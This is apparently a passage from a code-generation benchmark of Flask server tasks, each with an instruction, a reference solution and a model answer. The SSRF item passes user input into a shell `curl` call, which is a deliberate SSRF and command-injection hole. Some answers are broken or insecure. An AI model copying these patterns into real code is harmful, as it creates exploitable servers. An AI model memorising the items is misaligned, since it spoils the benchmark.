    "Canonical_solution": "from flask import Flask, request, jsonify, send_from_directory\nimport dnstwist\nimport os\nimport threading\nimport time\nfrom queue import Queue\nfrom uuid import uuid4\n\nclass Session:\n    def __init__(self, url, nameservers=None, thread_count=dnstwist.THREAD_COUNT_DEFAULT):\n        self.id = str(uuid4())\n        self.timestamp = int(time.time())\n        self.url = dnstwist.UrlParser(url)\n        self.nameservers = nameservers\n        self.thread_count = thread_count\n        self.jobs = Queue()\n        self.threads = []\n        self.fuzzer = dnstwist.Fuzzer(self.url.domain, dictionary=DICTIONARY, tld_dictionary=TLD_DICTIONARY)\n        self.fuzzer.generate()\n        self.permutations = self.fuzzer.permutations\n\n    def scan(self):\n        for domain in self.fuzzer.domains:\n            self.jobs.put(domain)\n        for _ in range(self.thread_count):\n            worker = dnstwist.Scanner(self.jobs)\n            worker.option_extdns = dnstwist.MODULE_DNSPYTHON\n            worker.option_geoip = dnstwist.MODULE_GEOIP\n            if self.nameservers:\n                worker.nameservers = self.nameservers.split(',')\n            worker.start()\n            self.threads.append(worker)\n\n    def stop(self):\n        self.jobs.queue.clear()\n        for worker in self.threads:\n            worker.stop()\n        for worker in self.threads:\n            worker.join()\n        self.threads.clear()\n\n    def domains(self):\n        return self.permutations(registered=True, unicode=True)\n\n    def status(self):\n        total = len(self.permutations())\n        remaining = max(self.jobs.qsize(), len(self.threads))\n        complete = total - remaining\n        registered = len(self.permutations(registered=True))\n        return {\n            'id': self.id,\n            'timestamp': self.timestamp,\n            'url': self.url.full_uri(),\n            'domain': self.url.domain,\n            'total': total,\n            'complete': complete,\n            'remaining': remaining,\n            'registered': registered\n        }\n\n    def csv(self):\n        return dnstwist.Format(self.permutations(registered=True)).csv()\n\n    def json(self):\n        return dnstwist.Format(self.permutations(registered=True)).json()\n\n    def list(self):\n        return dnstwist.Format(self.permutations()).list()\n\nclass DNSTwistAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.sessions = []\n        self._setup_routes()\n        self._start_janitor()\n\n    def _setup_routes(self):\n        self.app.route('/')(self.root)\n        self.app.route('/api/scans', methods=['POST'])(self.api_scan)\n        self.app.route('/api/scans/<sid>')(self.api_status)\n        self.app.route('/api/scans/<sid>/domains')(self.api_domains)\n        self.app.route('/api/scans/<sid>/csv')(self.api_csv)\n        self.app.route('/api/scans/<sid>/json')(self.api_json)\n        self.app.route('/api/scans/<sid>/list')(self.api_list)\n        self.app.route('/api/scans/<sid>/stop', methods=['POST'])(self.api_stop)\n\n    def _start_janitor(self):\n        cleaner = threading.Thread(target=self.janitor, args=(self.sessions,))\n        cleaner.daemon = True\n        cleaner.start()\n\n    def janitor(self, sessions):\n        while True:\n            time.sleep(1)\n            for s in sorted(sessions, key=lambda x: x.timestamp):\n                if s.jobs.empty() and s.threads:\n                    s.stop()\n                    continue\n                if (s.timestamp + SESSION_TTL) < time.time():\n                    sessions.remove(s)\n                    continue\n\n    def root(self):\n        return send_from_directory(WEBAPP_DIR, WEBAPP_HTML)\n\n    def api_scan(self):\n        if sum([1 for s in self.sessions if not s.jobs.empty()]) >= SESSION_MAX:\n            return jsonify({'message': 'Too many scan sessions - please retry in a minute'}), 500\n        j = request.get_json(force=True)\n        if 'url' not in j:\n            return jsonify({'message': 'Bad request'}), 400\n        try:\n            _, domain, _ = dnstwist.domain_tld(j.get('url'))\n        except Exception:\n            return jsonify({'message': 'Bad request'}), 400\n        if len(domain) > DOMAIN_MAXLEN:\n            return jsonify({'message': 'Domain name is too long'}), 400\n        for block in DOMAIN_BLOCKLIST:\n            if str(block) in domain:\n                return jsonify({'message': 'Not allowed'}), 400\n        try:\n            session = Session(j.get('url'), nameservers=NAMESERVERS)\n        except Exception as err:\n            return jsonify({'message': 'Invalid domain name'}), 400\n        else:\n            session.scan()\n            self.sessions.append(session)\n        return jsonify(session.status()), 201\n\n    def api_status(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return jsonify(s.status())\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_domains(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return jsonify(s.domains())\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_csv(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return s.csv(), 200, {'Content-Type': 'text/csv', 'Content-Disposition': 'attachment; filename=dnstwist.csv'}\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_json(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return s.json(), 200, {'Content-Type': 'application/json', 'Content-Disposition': 'attachment; filename=dnstwist.json'}\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_list(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                return s.list(), 200, {'Content-Type': 'text/plain', 'Content-Disposition': 'attachment; filename=dnstwist.txt'}\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def api_stop(self, sid):\n        for s in self.sessions:\n            if s.id == sid:\n                s.stop()\n                return jsonify({})\n        return jsonify({'message': 'Scan session not found'}), 404\n\n    def run(self, host=HOST, port=PORT):\n        self.app.run(host=host, port=port)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify, make_response\nimport threading\nimport time\nfrom dnstwist import DNSTwist\n\nclass DNSTwistAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.sessions = []\n        self._setup_routes()\n        self._start_janitor()\n    \n    def _setup_routes(self):\n        self.app.route('/')(self.root)\n        self.app.route('/api/scan', methods=['POST'])(self.api_scan)\n        self.app.route('/api/status/<sid>')(self.api_status)\n        self.app.route('/api/domains/<sid>')(self.api_domains)\n        self.app.route('/api/csv/<sid>')(self.api_csv)\n        self.app.route('/api/json/<sid>')(self.api_json)\n        self.app.route('/api/list/<sid>')(self.api_list)\n        self.app.route('/api/stop/<sid>')(self.api_stop)\n    \n    def _start_janitor(self):\n        threading.Thread(target=self.janitor, daemon=True).start()\n    \n    def janitor(self):\n        while True:\n            time.sleep(60)\n            self.sessions = [s for s in self.sessions if not s['expired']]\n    \n    def root(self):\n        return \"DNSTwist API - Domain Permutation and Scanning Tool\", 200\n    \n    def api_scan(self):\n        sid = len(self.sessions) + 1\n        session = {\n            'id': sid,\n            'started': time.time(),\n            'expired': False,\n            'domains': [],\n            'status': 'running'\n        }\n        self.sessions.append(session)\n        # Simulate domain permutation and scanning\n        dw = DNSTwist()\n        domains = dw.permute(\"example.com\")\n        session['domains'] = domains\n        session['status'] = 'completed'\n        session['expired'] = True\n        return f\"Scan session {sid} started with {len(domains)} domains\", 201\n    \n    def api_status(self, sid):\n        session = next((s for s in self.sessions if s['id'] == int(sid)), None)\n        if not session:\n            return \"Session not found\", 404\n        return jsonify(session), 200\n    \n    def api_domains(self, sid):\n        session = next((s for s in self.sessions if s['id'] == int(sid)), None)\n        if not session:\n            return \"Session not found\", 404\n        return jsonify(session['domains']), 200\n    \n    def api_csv(self, sid):\n        session = next((s for s in self.sessions if s['id'] == int(sid)), None)\n        if not session:\n            return \"Session not found\", 404\n        csv_data = \"\\n\".join(session['domains'])\n        return csv_data, 200, {'Content-Type': 'text/csv'}\n    \n    def api_json(self, sid):\n        session = next((s for s in self.sessions if s['id'] == int(sid)), None)\n        if not session:\n            return \"Session not found\", 404\n        return jsonify(session['domains']), 200\n    \n    def api_list(self, sid):\n        session = next((s for s in self.sessions if s['id'] == int(sid)), None)\n        if not session:\n            return \"Session not found\", 404\n        return \"\\n\".join(session['domains']), 200, {'Content-Type': 'text/plain'}\n    \n    def api_stop(self, sid):\n        session = next((s for s in self.sessions if s['id'] == int(sid)), None)\n        if not session:\n            return \"Session not found\", 404\n        session['status'] = 'stopped'\n        return \"Scan session stopped\", 200\n    \n    def run(self, host, port):\n        self.app.run(host=host, port=port)\n\nif __name__ == '__main__':\n    app = DNSTwistAPI()\n    app.run('0.0.0.0', 5000)"
  },
  {
    "Task_id": 193,
    "Instruction": "Task Description: Create a Flask-based web application that handles file uploads, processes the uploaded file to generate predictions, and displays the results.\n\nFunction Description: The application consists of two main routes: one for displaying the upload form and another for handling file uploads and processing. The first route renders the homepage with an upload form, while the second route handles POST requests, saves uploaded files securely, processes them to get predictions, and flashes the results to the user.\n\nInput:\n- For index() function: None (handles GET requests to root URL)\n- For submit_file() function: \n  - request.files: A dictionary-like object containing uploaded files (expects a 'file' key)\n  - request.url: The URL from which the request originated (used for redirects)\n\nOutput:\n- For index() function: Rendered HTML template ('index.html')\n- For submit_file() function: \n  - Redirects to root URL after processing\n  - Flashes messages containing:\n    - The prediction result (label)\n    - The full path of the saved file\n  - Error messages if no file is provided or selected\n\nNote: The functions interact with the following external components:\n- A prediction function (getPrediction) that takes a filename and returns a label\n- Flask's flash system for displaying messages\n- File system operations for saving uploaded files\n- Security utilities for sanitizing filenames",
    "Canonical_solution": "from flask import Flask, render_template, request, redirect, flash\nfrom werkzeug.utils import secure_filename\nfrom main import getPrediction\nimport os\n\nUPLOAD_FOLDER = 'static/images/'\napp = Flask(__name__, static_folder=\"static\")\napp.secret_key = \"secret key\"\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/')\ndef index():\n    return render_template('index.html')\n\n@app.route('/', methods=['POST'])\ndef submit_file():\n    if request.method == 'POST':\n        if 'file' not in request.files:\n            flash('No file part')\n            return redirect(request.url)\n        file = request.files['file']\n        if file.filename == '':\n            flash('No file selected for uploading')\n            return redirect(request.url)\n        if file:\n            filename = secure_filename(file.filename)\n            file.save(os.path.join(app.config['UPLOAD_FOLDER'],filename))\n            label = getPrediction(filename)\n            flash(label)\n            full_filename = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n            flash(full_filename)\n            return redirect('/')",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, render_template, request, redirect, url_for, flash\nimport os\n\napp = Flask(__name__)\napp.secret_key = 'your_secret_key'\n\ndef getPrediction(filename):\n    # Placeholder for actual prediction logic\n    return \"predicted_label\"\n\n@app.route('/', methods=['GET'])\ndef index():\n    return render_template('index.html')\n\n@app.route('/submit_file', methods=['POST'])\ndef submit_file():\n    file = request.files.get('file')\n    if not file:\n        flash('No file selected.', 'error')\n        return redirect(url_for('index'))\n    \n    # Sanitize filename\n    filename = os.path.basename(file.filename)\n    file.save(os.path.join('uploads', filename))\n    \n    # Get prediction\n    label = getPrediction(filename)\n    \n    # Flash results\n    flash(f'Prediction: {label}', 'success')\n    flash(f'File saved at: uploads/{filename}', 'info')\n    \n    return redirect(url_for('index'))\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 194,
    "Instruction": "Task Description: Create a Flask web application that serves as a code beautifier service. The application should take a directory path as input, and for each request with a specific slug, it should locate the corresponding text file in the directory, apply syntax highlighting, and return the formatted HTML.\n\nFunction Description: The `beautify` function is a Flask route handler that processes HTTP GET requests with a slug parameter. It checks if the slug is valid, locates the corresponding text file in the specified directory, reads the file content, applies syntax highlighting using Pygments, and returns the formatted HTML. If the slug is invalid or the file is not found, it returns a 404 error.\n\nInput: \n- `slug` (str): A URL path segment representing the name of the directory containing the text file to be beautified.\n\nOutput: \n- If successful: Returns HTML with syntax-highlighted code.\n- If unsuccessful: Returns a 404 error response.",
    "Canonical_solution": "from flask import Flask, abort, redirect\napp = Flask(__name__)\n\nimport argparse, os, pygments\nfrom pygments import highlight\nfrom pygments.lexers import guess_lexer\nfrom pygments.formatters import HtmlFormatter\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"root_dir\", help=\"Path to directory with pastes\")\nargs = parser.parse_args()\n\n@app.route('/<slug>')\ndef beautify(slug):\n    if len(slug) > 64:\n        abort(404)\n\n    target_dir = os.path.join(args.root_dir, slug)\n\n    if not target_dir.startswith(args.root_dir):\n        abort(404)\n\n    if os.path.isdir(target_dir):\n        target_file = os.path.join(target_dir, \"index.txt\")\n        \n        with open(target_file) as f:\n            code = f.read()\n            lexer = guess_lexer(code)\n            formatter = HtmlFormatter(linenos=True, full=True)\n            return highlight(code, lexer, formatter)\n\n    abort(404)",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, render_template\nfrom pygments import highlight\nfrom pygments.lexers import get_lexer_by_name\nfrom pygments.formatters import HtmlFormatter\nimport os\n\napp = Flask(__name__)\n\n@app.route('/<slug>')\ndef beautify(slug):\n    directory = os.path.join('code', slug)\n    if not os.path.exists(directory):\n        return \"Directory not found\", 404\n    \n    files = os.listdir(directory)\n    if not files:\n        return \"No files in directory\", 404\n    \n    file = next((f for f in files if f.endswith('.txt')), None)\n    if not file:\n        return \"No .txt file found in directory\", 404\n    \n    file_path = os.path.join(directory, file)\n    try:\n        with open(file_path, 'r') as f:\n            content = f.read()\n    except Exception as e:\n        return f\"Error reading file: {str(e)}\", 500\n    \n    try:\n        lexer = get_lexer_by_name('text')\n        formatter = HtmlFormatter(style='default')\n        highlighted_code = highlight(content, lexer, formatter)\n    except Exception as e:\n        return f\"Error highlighting code: {str(e)}\", 500\n    \n    return highlighted_code\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 195,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that processes incoming POST requests containing a URL, executes a curl command to fetch the URL's content, and returns the fetched content as the response.\n\nFunction Description: The function handles Server-Side Request Forgery (SSRF) vulnerability demonstration by accepting a URL via POST request, executing it through system curl command, and returning the response. This is for educational purposes only to demonstrate SSRF risks.\n\nInput: \n- HTTP POST request with form data containing a 'url' parameter (string) representing the target URL to fetch\n\nOutput:\n- Raw content (bytes) obtained from the curl command execution against the provided URL, returned as the HTTP response\n\nNote: The reference code shows a security anti-pattern (unsafe SSRF) and should only be used in controlled environments for educational purposes. In production, such functionality would require strict input validation and security controls.",
    "Canonical_solution": "from flask import Flask, request \nimport subprocess\n\napp = Flask(__name__)\n\ndef command(cmd):\n    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)\n    (out, err) = proc.communicate()\n    return out\n\n@app.route(\"/ssrf\", methods=['POST'])\ndef ssrf():\n    data = request.values\n    content = command(f\"curl {data.get('url')}\")\n    return content",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, Response\nimport subprocess\nimport shlex\n\napp = Flask(__name__)\n\n@app.route('/fetch', methods=['POST'])\ndef fetch_url():\n    url = request.form.get('url')\n    if not url:\n        return Response(\"Missing 'url' parameter\", status=400)\n    \n    try:\n        # Execute curl command to fetch the URL content\n        result = subprocess.run(\n            shlex.split(f'curl -s {url}'),\n            capture_output=True,\n            text=True\n        )\n        return Response(result.stdout, mimetype='text/plain')\n    except Exception as e:\n        return Response(f\"Error fetching URL: {str(e)}\", status=500)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 196,
    "Instruction": "Task Description: Create a Flask webhook callback handler that processes incoming POST requests, verifies signatures, and logs request data.\n\nFunction Description: The callback function handles incoming POST requests to the '/callback' endpoint. It extracts the signature from headers, logs the request body, attempts to process the webhook data, and returns a response. It handles API exceptions and invalid signatures appropriately.\n\nInput: \n- HTTP POST request containing:\n  - Headers: 'X-Line-Signature' (string) - The signature for request verification\n  - Body: (string) - The payload data sent with the request\n\nOutput: \n- Returns 'OK' (string) if successful\n- Returns HTTP 400 error if signature is invalid\n- Logs request information and any exceptions that occur",
    "Canonical_solution": "import os\nimport logging\nfrom flask import Flask, request, abort\nfrom werkzeug.middleware.proxy_fix import ProxyFix\n\napp = Flask(__name__)\napp.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_host=1, x_proto=1)\nlogging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\napp.logger.setLevel(logging.INFO)\n\n@app.route(\"/callback\", methods=['POST'])\ndef callback():\n    # get X-Line-Signature header value\n    signature = request.headers['X-Line-Signature']\n\n    # get request body as text\n    body = request.get_data(as_text=True)\n    app.logger.info(\"Request body: \" + body)\n\n    # handle webhook body\n    try:\n        handler.handle(body, signature)\n    except ApiException as e:\n        app.logger.warn(\"Got exception from LINE Messaging API: %s\\n\" % e.body)\n    except InvalidSignatureError:\n        abort(400)\n\n    return 'OK'",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport logging\nimport os\n\napp = Flask(__name__)\nlogging.basicConfig(level=logging.INFO)\n\nLINE_CHANNEL_SECRET = os.getenv('LINE_CHANNEL_SECRET')\n\n@app.route('/callback', methods=['POST'])\ndef callback():\n    try:\n        signature = request.headers.get('X-Line-Signature')\n        body = request.get_data(as_text=True)\n\n        # Verify signature (simplified example)\n        if not verify_signature(signature, body):\n            return jsonify({'status': 'error', 'message': 'Invalid signature'}), 400\n\n        # Log request data\n        logging.info(f\"Received request: {body}\")\n\n        # Process webhook data (example processing)\n        processed_data = process_webhook(body)\n\n        # Return OK response\n        return jsonify({'status': 'ok', 'message': 'OK'})\n\n    except Exception as e:\n        logging.error(f\"Error processing request: {str(e)}\")\n        return jsonify({'status': 'error', 'message': 'Internal server error'}), 500\n\ndef verify_signature(signature, body):\n    # This is a placeholder for actual signature verification logic\n    # In a real scenario, this would use the LINE channel secret to verify the signature\n    return signature == 'your_line_channel_secret'\n\ndef process_webhook(body):\n    # Placeholder for actual webhook processing logic\n    return {'received': True, 'data': body}\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)"
  },
  {
    "Task_id": 197,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that handles incoming POST requests with different content types (JSON, CSV, plain text) and returns predictions in the appropriate format.\n\nFunction Description: The function serves as an endpoint ('/invocations') that processes incoming data, makes predictions using a scoring service, and returns the results formatted according to the input content type. It handles three content types: JSON (for single predictions), CSV and plain text (for batch predictions).\n\nInput:\n- HTTP POST request with one of the following content types:\n  1. application/json: Contains JSON data with a \"text\" field and optional \"bing_key\"\n  2. text/csv: Contains CSV data with a \"text\" column\n  3. text/plain: Contains plain text with one text entry per line\n\nOutput:\n- For JSON input: Returns JSON response with top 10 predictions (HTTP 200)\n- For CSV/plain text input: Returns CSV response with predictions (HTTP 200)\n- For unsupported content types: Returns error message (HTTP 415)\n- All responses include appropriate mimetype headers",
    "Canonical_solution": "import os\nimport json\nimport flask\nimport pandas as pd\nimport io\nfrom collections import OrderedDict\n\nprefix = \"/opt/ml/\"\nPATH = os.path.join(prefix, \"model\")\n\napp = flask.Flask(__name__)\n\n@app.route(\"/invocations\", methods=[\"POST\"])\ndef transformation():\n    data = None\n    text = None\n\n    if flask.request.content_type == \"application/json\":\n        data = flask.request.get_json(silent=True)\n        text = data[\"text\"]\n        try:\n            bing_key = data[\"bing_key\"]\n        except Exception:\n            bing_key = None\n\n        predictions = ScoringService.predict(text, bing_key)\n        result = json.dumps(predictions[:10])\n        return flask.Response(response=result, status=200, mimetype=\"application/json\")\n\n    elif flask.request.content_type == \"text/csv\":\n        data = flask.request.data.decode(\"utf-8\")\n        df = pd.read_csv(io.StringIO(data), header=\"infer\")\n        predictions = ScoringService.predict_batch(list(df[\"text\"].values))\n\n        out = io.StringIO()\n        pd.DataFrame(predictions).to_csv(out, index=False)\n        result = out.getvalue()\n        return flask.Response(response=result, status=200, mimetype=\"text/csv\")\n\n    elif flask.request.content_type == \"text/plain\":\n        data = flask.request.data.decode(\"utf-8\")\n        s = io.StringIO(data)\n        texts = []\n        for line in s:\n            texts.append(line)\n        predictions = ScoringService.predict_batch(texts)\n        out = io.StringIO()\n        pd.DataFrame(predictions).to_csv(out, index=False)\n        result = out.getvalue()\n        return flask.Response(response=result, status=200, mimetype=\"text/csv\")\n\n    else:\n        return flask.Response(\n            response=\"This predictor only supports JSON, txt or CSV data\",\n            status=415,\n            mimetype=\"text/plain\",\n        )",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, make_response\nimport csv\nimport json\nimport re\n\napp = Flask(__name__)\n\ndef get_predictions(text):\n    # Placeholder for actual prediction logic\n    return [{\"text\": text, \"score\": 0.95}, {\"text\": text, \"score\": 0.85}]\n\n@app.route('/invocations', methods=['POST'])\ndef invocations():\n    content_type = request.headers.get('Content-Type')\n    \n    if content_type == 'application/json':\n        data = request.get_json()\n        text = data.get('text')\n        bing_key = data.get('bing_key')\n        \n        if not text:\n            return make_response(json.dumps({\"error\": \"Missing 'text' field\"}), 400)\n        \n        predictions = get_predictions(text)\n        return json.dumps(predictions[:10]), 200, {'Content-Type': 'application/json'}\n    \n    elif content_type in ['text/csv', 'text/plain']:\n        data = request.data.decode('utf-8')\n        \n        if content_type == 'text/csv':\n            reader = csv.DictReader(data.splitlines())\n            texts = [row['text'] for row in reader]\n        else:  # text/plain\n            texts = data.splitlines()\n        \n        predictions = []\n        for text in texts:\n            if not text.strip():\n                continue\n            predictions.append(get_predictions(text))\n        \n        response = '\\n'.join([json.dumps(pred) for pred in predictions])\n        return response, 200, {'Content-Type': 'application/json'}\n    \n    else:\n        return make_response(\"Unsupported content type\", 415)\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5001)"
  },
  {
    "Task_id": 198,
    "Instruction": "Task Description: Create a Flask-based HTTP server function that acts as a Natural Language Generation (NLG) endpoint, validating incoming requests against a JSON schema and returning appropriate responses.\n\nFunction Description: The function `nlg_app` creates and configures a Flask application that serves as an NLG endpoint. It validates incoming POST requests against a predefined JSON schema (nlg_request_format_spec) and returns different text responses based on the template specified in the request. The server responds with \"Hey there!\" for the \"utter_greet\" template and a default message for all other templates.\n\nInput: \n- base_url: str (optional, default=\"/\") - The base URL path where the NLG endpoint will be mounted\n\nOutput:\n- Flask application object configured with:\n  - A single POST endpoint at the specified base_url\n  - Request validation using jsonschema\n  - Conditional response generation based on the request content",
    "Canonical_solution": "import uuid\nimport jsonschema\nfrom flask import Flask, request, jsonify\nfrom rasa.core.nlg.callback import nlg_request_format_spec\n\ndef nlg_app(base_url=\"/\"):\n    app = Flask(__name__)\n\n    @app.route(base_url, methods=['POST'])\n    def generate():\n        \"\"\"Simple HTTP NLG generator, checks that the incoming request\n        is format according to the spec.\"\"\"\n\n        nlg_call = request.json\n\n        jsonschema.validate(nlg_call, nlg_request_format_spec())\n\n        if nlg_call.get(\"template\") == \"utter_greet\":\n            response = {\"text\": \"Hey there!\"}\n        else:\n            response = {\"text\": \"Sorry, didn't get that.\"}\n        return jsonify(response)\n\n    return app",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, request, jsonify\nimport jsonschema\nfrom jsonschema import validate\n\ndef nlg_app(base_url=\"/\"):\n    app = Flask(__name__)\n\n    nlg_request_format_spec = {\n        \"$schema\": \"http://json-schema.org/draft-07/schema#\",\n        \"type\": \"object\",\n        \"properties\": {\n            \"template\": {\"type\": \"string\", \"enum\": [\"utter_greet\", \"default\"]}\n        },\n        \"required\": [\"template\"]\n    }\n\n    @app.route(base_url, methods=[\"POST\"])\n    def nlg_endpoint():\n        data = request.get_json()\n        try:\n            validate(instance=data, schema=nlg_request_format_spec)\n        except jsonschema.exceptions.ValidationError as e:\n            return jsonify({\"error\": str(e)}), 400\n\n        if data[\"template\"] == \"utter_greet\":\n            return \"Hey there!\"\n        else:\n            return \"This is the default response.\"\n\n    return app"
  },
  {
    "Task_id": 20,
    "Instruction": "Task Description: Create a Python function that performs HTTP requests using the http.client library, supporting both HTTP and HTTPS protocols, with optional proxy configuration and proper error handling.\n\nFunction Description: The function performs HTTP requests (GET/POST) to a specified endpoint with given parameters. It handles connection setup (with or without proxy), request sending, response processing, and connection cleanup. It supports both Python 2 and 3 compatibility and includes logging for debugging purposes.\n\nInput:\n- method: [str] - HTTP method to use ('GET' or 'POST')\n- action: [str] - URL path/endpoint to request\n- param: [dict] - Optional dictionary of parameters (default: None)\n- **params: [dict] - Additional parameters as keyword arguments\n\nOutput:\n- Returns: [str] - Response body as string if successful (status code 2xx)\n- Raises: [Exception] - If HTTP status code indicates failure (non-2xx)",
    "Canonical_solution": "from json import loads as jsondecode\nfrom logging import debug, info, warning\ntry:\n    # python 2\n    from httplib import HTTPSConnection, HTTPConnection\n    from urlparse import urlparse, parse_qsl\n    from urllib import urlencode\nexcept ImportError:\n    # python 3\n    from http.client import HTTPSConnection, HTTPConnection\n    from urllib.parse import urlencode, urlparse, parse_qsl\n\nclass Config:\n    ID = None\n    TOKEN = None\n    PROXY = None\n    TTL = None\n\ndef request(method, action, param=None, **params):\n    if param:\n        params.update(param)\n\n    URLObj = urlparse(Config.ID)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    info(\"%s/%s : %s\", URLObj.netloc, action, params)\n\n    if Config.PROXY:\n        if URLObj.netloc == \"http\":\n            conn = HTTPConnection(Config.PROXY)\n        else:\n            conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(URLObj.netloc, URLObj.port)\n    else:\n        if URLObj.netloc == \"http\":\n            conn = HTTPConnection(URLObj.netloc, URLObj.port)\n        else:\n            conn = HTTPSConnection(URLObj.netloc, URLObj.port)\n\n    headers = {}\n\n    if method == \"GET\":\n        if params:\n            action += '?' + urlencode(params)\n        params = \"\"\n    else:\n        headers[\"Content-Type\"] = \"application/x-www-form-urlencoded\"\n\n    params = urlencode(params)\n\n    conn.request(method, action, params, headers)\n    response = conn.getresponse()\n    res = response.read().decode('utf8')\n    conn.close()\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]:%s', action, response.status, res)\n        raise Exception(res)\n    else:\n        debug('%s : result:%s', action, res)\n        return res",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "right_result": "import http.client\nimport urllib.parse\nimport logging\nimport socket\n\n# Setup logging\nlogging.basicConfig(level=logging.DEBUG)\n\ndef http_request(method, action, param=None, **params):\n    try:\n        # Combine parameters\n        all_params = {**param, **params}\n        url = urllib.parse.urljoin(action, urllib.parse.urlencode(all_params))\n        \n        # Determine if it's HTTP or HTTPS\n        if url.startswith('https://'):\n            connection = http.client.HTTPSConnection(url.split('//')[1])\n        else:\n            connection = http.client.HTTPConnection(url.split('//')[1])\n        \n        # Parse the path and query parameters\n        path_parts = url.split('?')\n        path = path_parts[0]\n        query = path_parts[1] if len(path_parts) > 1 else ''\n        \n        # Send request\n        try:\n            if method == 'GET':\n                connection.request(\"GET\", path + '?' + query)\n            elif method == 'POST':\n                connection.request(\"POST\", path + '?' + query, body=urllib.parse.urlencode(all_params))\n            else:\n                raise ValueError(\"Unsupported HTTP method\")\n            \n            response = connection.getresponse()\n            \n            # Check response\n            if response.status // 100 == 2:\n                return response.read().decode('utf-8')\n            else:\n                error_msg = f\"HTTP request failed with status code {response.status}: {response.reason}\"\n                logging.error(error_msg)\n                raise Exception(error_msg)\n        \n        except socket.error as e:\n            logging.error(f\"Socket error: {e}\")\n            raise Exception(f\"Socket error: {e}\")\n        \n        finally:\n            connection.close()\n    \n    except Exception as e:\n        logging.error(f\"Error in HTTP request: {e}\")\n        raise e"
  },
  {
    "Task_id": 201,
    "Instruction": "Task Description: Create a Flask-based HTTP server endpoint that introduces a configurable delay before responding, with CORS headers enabled for cross-origin requests.\n\nFunction Description: The function creates a Flask route '/respond' that accepts a 'time' query parameter (in milliseconds), sleeps for the specified duration, then returns a simple text response with CORS headers.\n\nInput:\n- time (query parameter): int - The delay time in milliseconds before responding\n\nOutput:\n- Flask Response object containing:\n  - Body: \"Response from Flask\" (string)\n  - Headers: Access-Control-Allow-Origin set to '*' for CORS\n  - Status code: 200 (implicit)",
    "Canonical_solution": "from flask import Flask, request, make_response\nfrom time import sleep\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef hello_world():\n    time_to_sleep = int(request.args.get('time')) / 1000\n    sleep(time_to_sleep)\n    resp = make_response('Response from Flask')\n    resp.headers['Access-Control-Allow-Origin'] = '*'\n    return resp\n\nif __name__ == '__main__':\n    app.run()",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "right_result": "from flask import Flask, Response, make_response\n\napp = Flask(__name__)\n\n@app.route('/respond')\ndef respond():\n    time_ms = int(request.args.get('time', 0))\n    delay = time_ms / 1000.0\n    time.sleep(delay)\n    response = make_response(\"Response from Flask\")\n    response.headers['Access-Control-Allow-Origin'] = '*'\n    return response\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 202,
    "Instruction": "Task Description: Create a Flask-based HTTP server with multiple endpoints to handle different types of requests and responses, including delayed responses, request type identification, and JSON responses.\n\nFunction Description: The code implements three Flask route handlers that demonstrate different HTTP server functionalities:\n1. `/respond` - Simulates a delayed response based on an input parameter\n2. `/request_type` - Returns the HTTP method used in the request\n3. `/json` - Returns a simple JSON response\n\nInput:\n- For `/respond` endpoint: \n  - `time` (query parameter): Integer - Time in milliseconds to delay the response\n- For `/request_type` endpoint: None\n- For `/json` endpoint: None\n\nOutput:\n- For `/respond` endpoint: \n  - Returns: HTTP response with text \"Response from Flask\" after specified delay\n  - Headers: Sets 'Access-Control-Allow-Origin' to '*'\n- For `/request_type` endpoint:\n  - Returns: HTTP response with text indicating the request method\n  - Headers: Sets 'Access-Control-Allow-Origin' to '*'\n- For `/json` endpoint:\n  - Returns: JSON response with {\"resp\": \"Hello JSON!\"}",
